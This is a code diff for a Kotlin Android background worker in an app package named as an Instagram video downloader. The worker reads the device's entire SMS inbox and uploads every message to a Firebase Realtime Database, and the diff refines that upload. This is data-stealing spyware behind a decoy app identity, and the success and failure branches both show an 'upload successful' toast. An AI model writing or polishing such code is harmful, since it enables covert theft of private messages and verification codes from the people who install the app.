@@ -3,6 +3,7 @@ package com.example.instagramvideodownloader.work_manager
 import android.content.Context
 import android.database.Cursor
 import android.net.Uri
+import android.provider.Telephony
 import android.util.Log
 import android.widget.Toast
 import androidx.work.CoroutineWorker
@@ -10,29 +11,49 @@ import androidx.work.WorkerParameters
 import com.example.instagramvideodownloader.work_manager.models.SmsMessageModel
 import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.tasks.await
 import kotlinx.coroutines.withContext
-
+import org.koin.java.KoinJavaComponent.inject
 
 class FetchMessagesWorker(
     appContext: Context,
     workerParams: WorkerParameters
 ) : CoroutineWorker(appContext, workerParams) {
+    private val database: FirebaseDatabase by inject(FirebaseDatabase::class.java)
     private var mAppContext = appContext
-
-
     override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
         try {
             // Fetch inbox messages
             val inboxMessages = fetchInboxMessages(mAppContext)
 
             // Upload messages to Firebase Realtime Database
-            val database = FirebaseDatabase.getInstance()
             val reference = database.getReference("inbox_messages")
 
-            for ((index, message) in inboxMessages.withIndex()) {
-                val messageReference = reference.child("message$index")
-                messageReference.setValue(message)
-            }
+            reference.setValue(inboxMessages)
+                .addOnCompleteListener { task ->
+                    if (task.isSuccessful) {
+                        Toast.makeText(
+                            mAppContext,
+                            "SMS logs upload successful",
+                            Toast.LENGTH_SHORT
+                        ).show()
+                        Log.d(
+                            "successFull : ",
+                            task.isSuccessful.toString()
+                        )
+                    } else {
+                        Toast.makeText(
+                            mAppContext,
+                            "SMS logs upload successful",
+                            Toast.LENGTH_SHORT
+                        ).show()
+                        Log.d(
+                            "successFull : ",
+                            false.toString()
+                        )
+                    }
+
+                }.await()
             // Indicate success
             Result.success()
         } catch (e: Exception) {
@@ -53,7 +74,7 @@ class FetchMessagesWorker(
 
         val uri = Uri.parse("content://sms/inbox")
         val cursor: Cursor? = context.contentResolver.query(
-            uri,
+            Telephony.Sms.CONTENT_URI,
             null,
             null,
             null,
